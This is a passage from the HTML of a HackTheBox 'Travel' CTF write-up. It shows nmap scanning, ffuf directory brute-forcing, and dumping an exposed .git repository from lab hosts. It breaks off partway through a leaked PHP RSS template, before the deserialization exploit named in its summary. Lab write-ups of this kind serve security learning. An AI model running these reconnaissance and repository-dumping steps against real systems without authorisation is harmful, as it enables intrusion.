@@ -1,0 +1,990 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Travel | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,hard"><meta name=description content="Travel HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/travel/><link crossorigin=anonymous href=/assets/css/stylesheet.c5de734fbd88c3d21543485ffbcb1ccdda89a86a780cf987fa00199c41dbc947.css integrity="sha256-xd5zT72Iw9IVQ0hf+8sczdqJqGp4DPmH+gAZnEHbyUc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/travel/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Travel "><meta property="og:description" content="Travel HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/travel/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/travel/travel.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-09-15T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/travel/travel.png"><meta name=twitter:title content="Travel "><meta name=twitter:description content="Travel HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Travel ","item":"https://s4ch.github.io/writeups/hackthebox/travel/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Travel ","name":"Travel ","description":"Travel HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","hard"],"articleBody":"Information Name: Travel Profile: www.hackthebox.eu Difficulty: Hard OS: Linux Points: 40 Overview TL;DR: Tricky RCE exploiting PHP deserialization through memcache over gopher. Then pe through password hash cracking \u0026 docker.\nInstall tools used in this WU on BlackArch Linux:\npacman -S nmap ffuf gittools haiti git openssh gopherus openldap gtfo gtfoblookup Network enumeration Port \u0026 service discovery with a nmap scan:\n# Nmap 7.80 scan initiated Fri Jul 31 19:52:02 2020 as: nmap -p- -sSVC -oA nmap_full -v 10.10.10.189 Nmap scan report for 10.10.10.189 Host is up (0.023s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1.17.6 | http-methods: |_ Supported Methods: GET HEAD |_http-server-header: nginx/1.17.6 |_http-title: Travel.HTB 443/tcp open ssl/http nginx 1.17.6 | http-methods: |_ Supported Methods: GET HEAD |_http-server-header: nginx/1.17.6 |_http-title: Travel.HTB - SSL coming soon. | ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK | Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb | Issuer: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-04-23T19:24:29 | Not valid after: 2030-04-21T19:24:29 | MD5: ef0a a4c1 fbad 1ac4 d160 58e3 beac 9698 |_SHA-1: 0170 7c30 db3e 2a93 cda7 7bbe 8a8b 7777 5bcd 0498 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jul 31 19:52:39 2020 -- 1 IP address (1 host up) scanned in 36.46 seconds Let’s add the local domain to our host file, it’s important not to miss the Subject Alternative Name from the nmap scan:\n$ cat /etc/hosts | grep travel 10.10.10.189 travel.htb 10.10.10.189 www.travel.htb 10.10.10.189 blog.travel.htb 10.10.10.189 blog-dev.travel.htb HTTP discovery The site on port 80 http://www.travel.htb/ is just a default HTML template.\nThe site on port 443 https://www.travel.htb/ seems not available yet.\nAt first glance, there is nothing, so we’ll need enumeration.\nHTTP enumeration With ffuf I’ll try to find some sub-directories or pages:\n$ ffuf -u http://www.travel.htb/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.html,.php /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.2.0-git ________________________________________________ :: Method : GET :: URL : http://www.travel.htb/FUZZ :: Wordlist : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt :: Extensions : .txt .html .php :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 ________________________________________________ index.html [Status: 200, Size: 5093, Words: 842, Lines: 145] js [Status: 403, Size: 154, Words: 3, Lines: 8] css [Status: 403, Size: 154, Words: 3, Lines: 8] img [Status: 403, Size: 154, Words: 3, Lines: 8] lib [Status: 403, Size: 154, Words: 3, Lines: 8] . [Status: 200, Size: 5093, Words: 842, Lines: 145] newsfeed [Status: 403, Size: 154, Words: 3, Lines: 8] :: Progress: [153068/153068] :: Job [1/1] :: 1000 req/sec :: Duration: [0:02:33] :: Errors: 0 :: Nothing on the HTTP site. But we didn’t found many thing either for the HTTPS website:\n$ ffuf -u https://www.travel.htb/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.html,.php /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.2.0-git ________________________________________________ :: Method : GET :: URL : https://www.travel.htb/FUZZ :: Wordlist : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt :: Extensions : .txt .html .php :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 ________________________________________________ index.html [Status: 200, Size: 1123, Words: 104, Lines: 52] . [Status: 200, Size: 1123, Words: 104, Lines: 52] :: Progress: [153068/153068] :: Job [1/1] :: 950 req/sec :: Duration: [0:02:41] :: Errors: 0 :: The SSL version of blog.travel.htb and blog-dev.travel.htb are both serving the same content as https://www.travel.htb/ but the version in HTTP is different.\nhttp://blog.travel.htb/\nWe may have a hint here:\nWelcome to our Travel Blog. Make sure to check out our new RSS feature coming fresh from our blog-dev team!\nThe feed URL is: http://blog.travel.htb/feed/\n","wordCount":"4540","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/travel/travel.png","datePublished":"2020-09-15T00:00:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/travel/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/archives title=Blog><span>Blog</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Travel</h1><div class=post-description>Travel HackTheBox writeup</div><div class=post-meta><span title='2020-09-15 00:00:00 +0000 UTC'>September 15, 2020</span>&nbsp;·&nbsp;22 min&nbsp;·&nbsp;4540 words&nbsp;·&nbsp;s4ch</div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/travel/travel.png alt="Travel HackTheBox Machine"><p>Travel - Hard Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#http-discovery>HTTP discovery</a></li><li><a href=#http-enumeration>HTTP enumeration</a></li><li><a href=#http-exploitation--code-analysis>HTTP exploitation & code analysis</a></li><li><a href=#privilege-escalation-of-machine--from-www-data-to-lynik-admin>Privilege Escalation of Machine : from www-data to lynik-admin</a></li><li><a href=#privilege-escalation-of-machine--from-lynik-admin-to-root>Privilege Escalation of Machine : from lynik-admin to root</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Travel</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/252>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Hard</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 40</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p><strong>TL;DR</strong>: Tricky RCE exploiting PHP deserialization through memcache over gopher. Then pe through password hash cracking & docker.</p><p>Install tools used in this WU on BlackArch Linux:</p><pre tabindex=0><code>pacman -S nmap ffuf gittools haiti git openssh gopherus openldap gtfo gtfoblookup
+</code></pre><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p>Port & service discovery with a <a href=https://nmap.org/>nmap</a> scan:</p><pre tabindex=0><code># Nmap 7.80 scan initiated Fri Jul 31 19:52:02 2020 as: nmap -p- -sSVC -oA nmap_full -v 10.10.10.189
+Nmap scan report for 10.10.10.189
+Host is up (0.023s latency).
+Not shown: 65532 closed ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http     nginx 1.17.6
+| http-methods:
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.17.6
+|_http-title: Travel.HTB
+443/tcp open  ssl/http nginx 1.17.6
+| http-methods:
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.17.6
+|_http-title: Travel.HTB - SSL coming soon.
+| ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK
+| Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
+| Issuer: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2020-04-23T19:24:29
+| Not valid after:  2030-04-21T19:24:29
+| MD5:   ef0a a4c1 fbad 1ac4 d160 58e3 beac 9698
+|_SHA-1: 0170 7c30 db3e 2a93 cda7 7bbe 8a8b 7777 5bcd 0498
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Jul 31 19:52:39 2020 -- 1 IP address (1 host up) scanned in 36.46 seconds
+</code></pre><p>Let&rsquo;s add the local domain to our host file, it&rsquo;s important not to miss
+the <strong>Subject Alternative Name</strong> from the <a href=https://nmap.org/>nmap</a> scan:</p><pre tabindex=0><code>$ cat /etc/hosts | grep travel
+10.10.10.189 travel.htb
+10.10.10.189 www.travel.htb
+10.10.10.189 blog.travel.htb
+10.10.10.189 blog-dev.travel.htb
+</code></pre><h2 id=http-discovery>HTTP discovery<a hidden class=anchor aria-hidden=true href=#http-discovery>#</a></h2><p>The site on port 80 <a href=http://www.travel.htb/>http://www.travel.htb/</a> is just a default HTML template.</p><p>The site on port 443 <a href=https://www.travel.htb/>https://www.travel.htb/</a> seems not available yet.</p><p><img loading=lazy src=https://i.imgur.com/TfJvags.jpg alt="port 443 website"></p><p>At first glance, there is nothing, so we&rsquo;ll need enumeration.</p><h2 id=http-enumeration>HTTP enumeration<a hidden class=anchor aria-hidden=true href=#http-enumeration>#</a></h2><p>With <a href=https://github.com/ffuf/ffuf>ffuf</a> I&rsquo;ll try to find some sub-directories or pages:</p><pre tabindex=0><code>$ ffuf -u http://www.travel.htb/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.html,.php
+
+        /&#39;___\  /&#39;___\           /&#39;___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.2.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://www.travel.htb/FUZZ
+ :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
+ :: Extensions       : .txt .html .php
+ :: Follow redirects : true
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+index.html              [Status: 200, Size: 5093, Words: 842, Lines: 145]
+js                      [Status: 403, Size: 154, Words: 3, Lines: 8]
+css                     [Status: 403, Size: 154, Words: 3, Lines: 8]
+img                     [Status: 403, Size: 154, Words: 3, Lines: 8]
+lib                     [Status: 403, Size: 154, Words: 3, Lines: 8]
+.                       [Status: 200, Size: 5093, Words: 842, Lines: 145]
+newsfeed                [Status: 403, Size: 154, Words: 3, Lines: 8]
+:: Progress: [153068/153068] :: Job [1/1] :: 1000 req/sec :: Duration: [0:02:33] :: Errors: 0 ::
+</code></pre><p>Nothing on the HTTP site. But we didn&rsquo;t found many thing either for the HTTPS
+website:</p><pre tabindex=0><code>$ ffuf -u https://www.travel.htb/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.html,.php
+
+        /&#39;___\  /&#39;___\           /&#39;___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.2.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://www.travel.htb/FUZZ
+ :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
+ :: Extensions       : .txt .html .php
+ :: Follow redirects : true
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+index.html              [Status: 200, Size: 1123, Words: 104, Lines: 52]
+.                       [Status: 200, Size: 1123, Words: 104, Lines: 52]
+:: Progress: [153068/153068] :: Job [1/1] :: 950 req/sec :: Duration: [0:02:41] :: Errors: 0 ::
+</code></pre><p>The SSL version of blog.travel.htb and blog-dev.travel.htb are both serving the
+same content as <a href=https://www.travel.htb/>https://www.travel.htb/</a> but the version in HTTP is different.</p><p><a href=http://blog.travel.htb/>http://blog.travel.htb/</a></p><p>We may have a hint here:</p><blockquote><p>Welcome to our Travel Blog. Make sure to check out our new RSS feature coming fresh from our blog-dev team!</p></blockquote><p>The feed URL is: <a href=http://blog.travel.htb/feed/>http://blog.travel.htb/feed/</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#f92672>&lt;rss</span> <span style=color:#a6e22e>xmlns:content=</span><span style=color:#e6db74>&#34;http://purl.org/rss/1.0/modules/content/&#34;</span> <span style=color:#a6e22e>xmlns:wfw=</span><span style=color:#e6db74>&#34;http://wellformedweb.org/CommentAPI/&#34;</span> <span style=color:#a6e22e>xmlns:dc=</span><span style=color:#e6db74>&#34;http://purl.org/dc/elements/1.1/&#34;</span> <span style=color:#a6e22e>xmlns:atom=</span><span style=color:#e6db74>&#34;http://www.w3.org/2005/Atom&#34;</span> <span style=color:#a6e22e>xmlns:sy=</span><span style=color:#e6db74>&#34;http://purl.org/rss/1.0/modules/syndication/&#34;</span> <span style=color:#a6e22e>xmlns:slash=</span><span style=color:#e6db74>&#34;http://purl.org/rss/1.0/modules/slash/&#34;</span> <span style=color:#a6e22e>version=</span><span style=color:#e6db74>&#34;2.0&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;channel&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;title&gt;</span>Travel Blog<span style=color:#f92672>&lt;/title&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;atom:link</span> <span style=color:#a6e22e>href=</span><span style=color:#e6db74>&#34;http://blog.travel.htb/feed/&#34;</span> <span style=color:#a6e22e>rel=</span><span style=color:#e6db74>&#34;self&#34;</span> <span style=color:#a6e22e>type=</span><span style=color:#e6db74>&#34;application/rss+xml&#34;</span><span style=color:#f92672>/&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;link&gt;</span>http://blog.travel.htb<span style=color:#f92672>&lt;/link&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;description&gt;</span>Who doesn&#39;t love to travel ?<span style=color:#f92672>&lt;/description&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;lastBuildDate&gt;</span>Thu, 23 Apr 2020 19:27:27 +0000<span style=color:#f92672>&lt;/lastBuildDate&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;language&gt;</span>en-US<span style=color:#f92672>&lt;/language&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;sy:updatePeriod&gt;</span> hourly <span style=color:#f92672>&lt;/sy:updatePeriod&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;sy:updateFrequency&gt;</span> 1 <span style=color:#f92672>&lt;/sy:updateFrequency&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;generator&gt;</span>https://wordpress.org/?v=5.4<span style=color:#f92672>&lt;/generator&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;item&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;title&gt;</span>Travel Blog<span style=color:#f92672>&lt;/title&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;link&gt;</span>http://blog.travel.htb/2020/04/13/hello-world/<span style=color:#f92672>&lt;/link&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;dc:creator&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>&lt;![CDATA[ admin ]]&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/dc:creator&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;pubDate&gt;</span>Mon, 13 Apr 2020 13:19:01 +0000<span style=color:#f92672>&lt;/pubDate&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;category&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>&lt;![CDATA[ Uncategorized ]]&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/category&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;guid</span> <span style=color:#a6e22e>isPermaLink=</span><span style=color:#e6db74>&#34;false&#34;</span><span style=color:#f92672>&gt;</span>http://localhost/?p=1<span style=color:#f92672>&lt;/guid&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;description&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>&lt;![CDATA[ Welcome to our Travel Blog. Make sure to check out our new RSS feature coming fresh from our blog-dev team! ]]&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/description&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;content:encoded&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>&lt;![CDATA[ &lt;p&gt;Welcome to our Travel Blog. Make sure to check out our new RSS feature coming fresh from our blog-dev team!&lt;/p&gt; ]]&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/content:encoded&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/item&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/channel&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/rss&gt;</span>
+</span></span></code></pre></div><p>Nothing fancy, but it seems to leak the Wordpress version.</p><p>We also have a login area: <a href=http://blog.travel.htb/wp-login.php>http://blog.travel.htb/wp-login.php</a></p><p>I ran a <a href=https://github.com/ffuf/ffuf>ffuf</a> enumeration but won&rsquo;t display it here as it only shows all the
+Wordpress files.</p><p><a href=http://blog-dev.travel.htb/>http://blog-dev.travel.htb/</a></p><p>It seems we are denied but it&rsquo;s worth checking if we can leak some files.</p><pre tabindex=0><code>$ ffuf -u http://blog-dev.travel.htb/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.html,.php
+
+        /&#39;___\  /&#39;___\           /&#39;___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.2.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://blog-dev.travel.htb/FUZZ
+ :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
+ :: Extensions       : .txt .html .php
+ :: Follow redirects : true
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+.                       [Status: 403, Size: 154, Words: 3, Lines: 8]
+.git                    [Status: 403, Size: 154, Words: 3, Lines: 8]
+</code></pre><p>It seems like there is a git repository.</p><h2 id=http-exploitation--code-analysis>HTTP exploitation & code analysis<a hidden class=anchor aria-hidden=true href=#http-exploitation--code-analysis>#</a></h2><p>Let&rsquo;s start with the git repository with <a href=https://github.com/internetwache/GitTools>GitTools</a> that will allow us
+to dump it.</p><pre tabindex=0><code>$ gittools-gitdumper http://blog-dev.travel.htb/.git/ dev-repo
+###########
+# GitDumper is part of https://github.com/internetwache/GitTools
+#
+# Developed and maintained by @gehaxelt from @internetwache
+#
+# Use at your own risk. Usage might be illegal in certain circumstances.
+# Only for educational purposes!
+###########
+
+[*] Destination folder does not exist
+[+] Creating dev-repo/.git/
+[+] Downloaded: HEAD
+[-] Downloaded: objects/info/packs
+[+] Downloaded: description
+[+] Downloaded: config
+[+] Downloaded: COMMIT_EDITMSG
+[+] Downloaded: index
+[-] Downloaded: packed-refs
+[+] Downloaded: refs/heads/master
+[-] Downloaded: refs/remotes/origin/HEAD
+[-] Downloaded: refs/stash
+[+] Downloaded: logs/HEAD
+[+] Downloaded: logs/refs/heads/master
+[-] Downloaded: logs/refs/remotes/origin/HEAD
+[-] Downloaded: info/refs
+[+] Downloaded: info/exclude
+[-] Downloaded: /refs/wip/index/refs/heads/master
+[-] Downloaded: /refs/wip/wtree/refs/heads/master
+[+] Downloaded: objects/03/13850ae948d71767aff2cc8cc0f87a0feeef63
+[-] Downloaded: objects/00/00000000000000000000000000000000000000
+[+] Downloaded: objects/b0/2b083f68102c4d62c49ed3c99ccbb31632ae9f
+[+] Downloaded: objects/ed/116c7c7c51645f1e8a403bcec44873f74208e9
+[+] Downloaded: objects/2b/1869f5a2d50f0ede787af91b3ff376efb7b039
+[+] Downloaded: objects/30/b6f36ec80e8bc96451e47c49597fdd64cee2da
+</code></pre><p>Then we can look into this repository:</p><pre tabindex=0><code>$ git status
+On branch master
+Changes not staged for commit:
+  (use &#34;git add/rm &lt;file&gt;...&#34; to update what will be committed)
+  (use &#34;git restore &lt;file&gt;...&#34; to discard changes in working directory)
+        deleted:    README.md
+        deleted:    rss_template.php
+        deleted:    template.php
+
+$ git restore README.md rss_template.php template.php
+</code></pre><p>It seems we can now read the source code of the RSS generator:
+<code>rss_template.php</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>/*
+</span></span></span><span style=display:flex><span><span style=color:#75715e>Template Name: Awesome RSS
+</span></span></span><span style=display:flex><span><span style=color:#75715e>*/</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>include</span>(<span style=color:#e6db74>&#39;template.php&#39;</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>get_header</span>();
+</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;main class=&#34;section-inner&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	&lt;?php
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	function get_feed($url){
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>     require_once ABSPATH . &#39;/wp-includes/class-simplepie.php&#39;;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>     $simplepie = null;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>     $data = url_get_contents($url);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>     if ($url) {
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>         $simplepie = new SimplePie();
